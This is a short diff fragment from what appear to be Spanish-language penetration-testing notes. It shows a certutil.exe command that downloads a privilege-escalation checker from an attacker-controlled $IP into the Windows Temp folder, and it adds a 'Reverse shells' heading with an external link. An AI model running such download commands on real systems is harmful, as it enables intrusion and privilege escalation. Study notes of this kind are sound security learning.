@@ -6,3 +6,5 @@ Pasar a la maquina
 certutil.exe -urlcache -split -f "http://$IP/windowsprivchecker.bat" C:\Windows\Temp\privesc.bat < recomendacion por permisos de escritura 
 ```
 
+Reverse shells 
+https://www.puckiestyle.nl/
